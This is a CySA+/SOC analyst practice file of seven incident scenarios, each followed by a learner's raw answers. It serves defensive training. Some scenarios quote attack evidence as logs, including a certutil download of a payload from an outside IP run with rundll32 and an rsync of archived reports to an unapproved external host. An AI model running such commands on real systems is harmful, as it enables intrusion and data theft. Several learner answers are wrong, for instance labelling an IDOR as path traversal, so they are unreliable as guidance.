==============================
009-realistic-hands-on-soc-scenarios.txt
Author: ViliusDevX
Purpose: CySA+ / SOC Analyst Scenario Practice
Difficulty: Hard / Realistic / Hands-on
==============================

!!!RAW ANSWERS ONLY — KEEP MISTAKES AND UNCERTAINTY!!!

These scenarios are intentionally less obvious.
Some evidence is relevant, some is noise, and some points can be interpreted more than one way.
Focus on analyst reasoning: what you would validate, contain, escalate, preserve, and explain.

==================================================
SECTION 1 — REALISTIC SOC INVESTIGATION SCENARIOS (7)
==================================================


==================================================
SCENARIO 1
==================================================

Background:
A finance employee returned from a business trip two days ago. The employee normally works from Vilnius but recently used hotel Wi-Fi and airport Wi-Fi.

Microsoft 365 Sign-in Logs:
- 08:12 UTC — Successful login from Vilnius, Lithuania
- 08:19 UTC — Successful login from Amsterdam, Netherlands
- 08:24 UTC — Successful login from Vilnius, Lithuania
- MFA result: satisfied by previously registered method
- Client app: Browser
- Conditional Access: Passed
- Device compliance: Unknown
- Session ID reused across multiple requests

Mailbox Audit:
- SearchQuery initiated:
  subject:"invoice" OR subject:"payment" OR subject:"wire"
- 312 messages accessed in 11 minutes
- Inbox rule created:
  Name: "Archive processed"
  Condition: sender contains "vendor"
  Action: move to folder "RSS Feeds"
- Forwarding is not enabled

Defender for Cloud Apps:
- OAuth app consent granted:
  App name: "PDF Invoice Preview"
  Permissions: Mail.Read, offline_access
- Publisher: Unverified
- Consent type: User consent

Helpdesk Ticket:
The user says:
"I did open a PDF preview page from an invoice email yesterday, but I changed my password this morning."


Tasks:
1. What are the most likely explanations for the activity? List at least two possibilities.
2. Which evidence points toward compromise instead of normal travel?
3. Why might the password change not stop the suspicious access?
4. What should be revoked or disabled first?
5. Which logs would you review next to confirm mailbox impact?
6. What would you tell the user or helpdesk to avoid destroying evidence?
7. Suggest one detection rule idea for this scenario.

My Answers:

1. I see only token hijack with unauthorized account access, i would have said maybe normal activity but it looks very suspicious, not normal
2. Impossible travel, accessing a lot of messages in small amount of time, pdf page opened from invoice email
3. Because password change doesn't affect token compromise
4. Account should be locked or revoked from privileges, and there should be further investigation, particularly on possible token hijack
5. IP address during suspicious login, Defender for cloud apps logs.
6. Deleting account or removing any evidence like login logs
7. IF impossible travel login attempt in short amount of time AND suspicious activity (accessing a lot of messages, creating new rules) THEN revoke privileges and lock the account + extract logs

==================================================
SCENARIO 2
==================================================

Background:
A software deployment team uses remote management tools to update workstations after hours. One endpoint, WS-117, triggered several EDR alerts during the same maintenance window.

EDR Process Tree:
C:\Program Files\RemoteAssist\ra_service.exe
 └── C:\Windows\System32\cmd.exe /c whoami
 └── C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -File C:\ProgramData\update_check.ps1
      └── C:\Windows\System32\certutil.exe -urlcache -split -f http://185.199.108.90/win.dat C:\ProgramData\win.dat
      └── C:\Windows\System32\rundll32.exe C:\ProgramData\win.dat,Start

File Details:
- win.dat has no vendor signature
- Hash is unknown in VirusTotal
- File was created only on WS-117
- RemoteAssist binary is signed and used in the company

Network:
- WS-117 connected to 185.199.108.90:80
- Then connected to 45.83.12.44:443 every 90 seconds
- No proxy category reputation available for 45.83.12.44

Admin Chat:
A deployment engineer says:
"We did push updates last night, but I don't recognize win.dat or that IP."

Tasks:
1. What is the most likely security concern?
2. What evidence could still be legitimate admin activity?
3. What evidence makes it suspicious despite the signed remote tool?
4. What should be contained first: the host, the remote tool, the admin account, or the IP? Explain.


My Answers:

1. Possible machine compromise and persistence established, powershell command execution
2. update_check.ps1, recent updates done, RemoteAssist binary is signed
3. Powershell command execution bypassing policy, connection to external ip and timed connection to other external ip, indicating possible C2
4. The host, because tool was just a way to gain foothold in machine, containing admin account wouldn't do much, so the best decision is to contain and isolate the host, collect logs and investigate.




==================================================
SCENARIO 3
==================================================

Background:
A product manager has access to customer research documents. DLP alerts triggered after unusual cloud storage activity.

CASB / Cloud Logs:
- User: lina.p@company.example
- Source IP: normal corporate VPN range
- Device: personal laptop, not managed by MDM
- Downloaded 4.8GB from SharePoint folder:
  /ProductStrategy/2027-Roadmap/
- Uploaded 4.6GB to:
  https://drive-storage-personal.example/upload
- Activity started at 22:41 local time
- User authenticated successfully with MFA

HR Context:
- User is moving to another internal team in two weeks
- No resignation submitted
- Manager says the user is preparing a handover
- The destination cloud service is not approved for company data

Endpoint Context:
- No EDR agent installed because device is personal/BYOD
- No malware indicators available
- User claims:
  "I needed the files at home because SharePoint was slow."

Tasks:
1. What are the main possible explanations?
2. Why is this not automatically proof of malicious insider theft?
3. Why is it still a security incident or policy violation?
4. What should analysts verify before disabling the account?


My Answers:

1. Legitimate activity however violating company's policy because destination cloud service was not approved for company data
2. Because there is no real indicators of malicious activity like impossible travel, multiple failed logins, unusual behavior 
3. Because user was not allowed to store company data in un-approved service
4. Verify if there was no other data accessed

==================================================
SCENARIO 4
==================================================

Background:
A customer support portal uses an API endpoint to retrieve ticket attachments. The WAF has no SQL injection alerts, but customers report seeing files that do not belong to them.

Web/API Logs:
- 10.4.8.22 user_id=884 GET /api/tickets/88421/attachment/1 HTTP 200
- 10.4.8.22 user_id=884 GET /api/tickets/88422/attachment/1 HTTP 403
- 10.4.8.22 user_id=884 GET /api/tickets/88423/attachment/1 HTTP 200
- 10.4.8.22 user_id=884 GET /api/tickets/88424/attachment/1 HTTP 200
- 10.4.8.22 user_id=884 GET /api/tickets/88425/attachment/1 HTTP 403

Application Notes:
- Ticket IDs are sequential
- Authentication is required
- Authorization checks are handled by backend logic
- No obvious SQL injection, XSS, or command injection payloads
- Rate limit did not trigger because requests were slow

Customer Report:
A customer says:
"I changed one number in the URL and opened someone else's attachment."

Tasks:
1. What vulnerability class is most likely?
2. Why would a WAF miss this?
3. What evidence supports authorization abuse rather than injection?
4. What should be done first to reduce exposure?
5. Which logs or database fields would help determine impacted customers?

My Answers:

1. Path traversal, it allows users to access data they weren't allowed to
2. Because it's not an intrusion or attack, most likely caused due to lack of input sanitization, code flaw
3. Slow requests, no obvious malicious payloads, authentication is required
4. Fix the code long-term, or disable feature to access anything for anybody short-term
5. GET requests and requested data user id


==================================================
SCENARIO 5
==================================================

Background:
A SIEM correlation rule triggered for failed logins across many users. The source is an internal application server, APP-03.

Windows Security Logs:
- 4625 failed logon events against 146 users over 3 hours
- Failure reason: bad password
- Logon Type: 3
- Source: APP-03
- Authentication package: NTLM
- Attempts occur every 75 seconds
- One account, svc_reports, succeeds after several failures
- Event ID 4672 occurs for svc_reports on FILE-02
- Shortly after, FILE-02 logs access to \\FILE-02\C$

Application Team:
APP-03 runs an old reporting app using stored credentials.
The team says:
"The app sometimes fails when the password expires."

Additional Context:
- svc_reports should only read reports from SQL-02
- svc_reports should not access FILE-02 admin shares
- No approved change window occurred

Tasks:
1. What are the possible benign and malicious explanations?
2. Which detail makes this more serious than a broken application password?
3. What should be investigated first?
4. What containment action would reduce risk without breaking everything immediately?
5. Which accounts and hosts should be scoped?


My Answers:

1. Password spraying or credential stuffing, then priv esc, then root level access. Reporting app most likely resets expired passwords to weak ones or default
2. Reporting app stores credentials, meaning all users can be affected
3. The logic behind handling of expired password accounts by app
4. Disabling app's expired password handling (not sure, maybe disabling login possibility but it would mean more serious downtime, maybe disabling APP-03 for now).
5. APP-03, accessed accounts after server failures




==================================================
SCENARIO 6
==================================================

Background:
A Linux web server hosts internal reports. Network monitoring flagged a large outbound transfer late at night.

Linux auth.log:
Jun 10 01:12:44 web-02 sshd[1833]: Accepted publickey for deploy from 10.0.6.12 port 52218 ssh2
Jun 10 01:14:02 web-02 sudo: deploy : TTY=pts/0 ; PWD=/srv/reports ; USER=root ; COMMAND=/usr/bin/tar -czf /tmp/reports_june.tar.gz /srv/reports
Jun 10 01:18:27 web-02 sudo: deploy : TTY=pts/0 ; USER=root ; COMMAND=/usr/bin/rsync -av /tmp/reports_june.tar.gz backup@203.0.113.88:/incoming/

Cron:
- /etc/cron.d/nightly-report-sync exists
- The cron job normally runs at 03:00, not 01:18
- The destination in the cron job is backup@10.0.9.40:/backup/reports/

NetFlow:
- src=web-02 dst=203.0.113.88 dst_port=22 bytes_out=2800000000 bytes_in=64000 duration=980

Admin Context:
The deploy user belongs to the web deployment group.
The backup vendor says 203.0.113.88 is not their address.

Tasks:
1. What is the most likely concern?
2. What could make this look like legitimate admin or backup activity?
3. Which evidence makes it suspicious?
4. What should be preserved before deleting files or killing sessions?

My Answers:

1. Most likely data exfil, legitimate activity is very unlikely here because of several suspicious events
2. This could be legitimate admin or backup activity if it was at a dedicated time and to a dedicated backup address
3. Unusual time, suspicious backup address
4. Logs, activity artifacts like commands, data traffic



==================================================
SCENARIO 7
==================================================

Background:
Leadership wants all "critical" vulnerabilities patched immediately. Operations says some systems cannot be patched this week.

Vulnerability A:
- Internet-facing VPN appliance
- CVSS: 9.8
- Public exploit available
- Exploitation observed in the wild
- Device provides remote access for employees
- Patch available

Vulnerability B:
- Internal database server
- CVSS: 8.6
- Contains sensitive customer data
- No public exploit
- Requires authenticated network access
- Patch requires 4 hours downtime

Vulnerability C:
- Public marketing website
- CVSS: 9.1
- Vulnerable component exposed only on admin panel
- Admin panel restricted by IP allowlist
- WAF rule available
- Patch available next week

Vulnerability D:
- Legacy manufacturing workstation
- CVSS: 7.5
- No patch available
- Controls physical process equipment
- Network segmented but monitoring is weak
- Vendor recommends disabling SMBv1 but app team says it may break production

Tasks:
1. Which vulnerability should be prioritized first and why?
2. Which vulnerability needs compensating controls instead of normal patching?
3. Which vulnerability may have a lower immediate risk than its CVSS suggests?
4. What additional business context would you ask for?
5. What should be done if patching the VPN appliance fails?

My Answers:

1. I would say either A or D, i think A, because D is exploitable but network is segmented, even if monitoring is weak. While A has an actively exploitable high CVSS rating vulnerability and provides remote access for employees, meaning if exploited it would mean probably lateral movement or priv esc. B contains sensitive info but no exploit available and authenticated access required, C is hard to exploit and doesn't have any sensitive info, at least from the description.
2. D, because there is no patch available. I would say segmentation is the best decision
3. C, because it's too hard to exploit and patch available soon
4. How much sensitive data is stored on B internal db server, is it PI, what kind of security training do employees go through, and how costly is it to replace legacy system
5. Finding an alternative to current VPN appliance, maybe other VPN service or platform

==============================
END OF FILE
==============================